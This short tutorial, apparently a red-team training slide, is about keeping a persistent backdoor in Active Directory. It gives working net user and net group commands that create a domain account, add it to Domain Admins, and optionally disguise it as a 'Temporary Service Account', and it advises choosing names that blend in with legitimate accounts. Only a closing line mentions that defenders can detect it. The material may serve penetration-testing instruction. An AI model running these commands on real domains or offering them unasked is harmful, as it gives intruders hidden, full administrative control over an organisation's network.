Practical Backdoor Account Creation

Using command-line tools to create and elevate a Domain Admin backdoor.

Step 1: Create User

The net user command is used to create a new user account within the domain. Choose a name that can blend in with legitimate accounts.

Step 2: Elevate Privileges

Add the newly created user to the Domain Admins group using the net group command. This grants full administrative control over the Active Directory.

Command Line Example
# From a compromised DC or machine with Domain Admin creds

# 1. Create a new user account
net user newbackdoor P@ssw0rd123! /add /domain

# 2. Add the user to the "Domain Admins" group
net group "Domain Admins" newbackdoor /add /domain

# Optional: Modify account description for stealth
# net user newbackdoor /comment:"Temporary Service Account" /domain
Key Takeaway

Directly creating and elevating a Domain Admin account is a powerful persistence method, but it generates auditable events that defenders can detect.
